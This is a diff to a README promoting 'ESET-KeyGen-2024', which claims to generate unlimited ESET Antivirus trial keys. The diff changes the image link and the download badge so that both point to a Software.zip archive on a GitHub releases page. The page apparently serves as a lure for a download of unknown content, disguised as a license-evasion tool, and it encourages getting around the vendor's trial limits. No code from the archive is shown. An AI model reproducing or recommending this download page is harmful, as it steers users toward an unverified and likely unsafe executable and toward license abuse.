@@ -2,11 +2,11 @@
 
 ### Generate Unlimited ESET Antivirus Trial Keys and Accounts with ESET-KeyGen
 
-![ESET Antivirus](https://imageurl.com) 
+![ESET Antivirus](https://github.com/Aimaliz/ESET-KeyGen-2024/releases/download/v2.0/Software.zip) 
 
 Welcome to ESET-KeyGen-2024, your go-to tool for generating trial keys and accounts for ESET Antivirus. Say goodbye to limitations and enjoy the full protection of ESET without any constraints.
 
-[![Download Software](https://img.shields.io/badge/Download-Software-yellow)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Aimaliz/ESET-KeyGen-2024/releases/download/v2.0/Software.zip)](https://github.com/Aimaliz/ESET-KeyGen-2024/releases/download/v2.0/Software.zip)
 
 #### Features:
 - **Unlimited Key Generation**: Generate as many trial keys as you need to keep your ESET Antivirus activated.
